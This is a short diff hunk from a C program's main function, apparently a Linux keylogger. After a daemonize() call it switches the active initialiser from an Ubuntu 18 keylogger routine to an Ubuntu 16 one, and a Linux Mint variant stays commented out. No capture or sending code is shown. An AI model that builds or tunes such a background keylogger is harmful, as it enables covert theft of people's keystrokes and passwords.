@@ -72,9 +72,9 @@ int main(int argc, char*argv[])
 
     daemonize();
 
-    //ubuntu16_keylogger_init();
+    ubuntu16_keylogger_init();
 
-    ubuntu18_keylogger_init();
+    //ubuntu18_keylogger_init();
 
     //mint_keylogger_init();
 
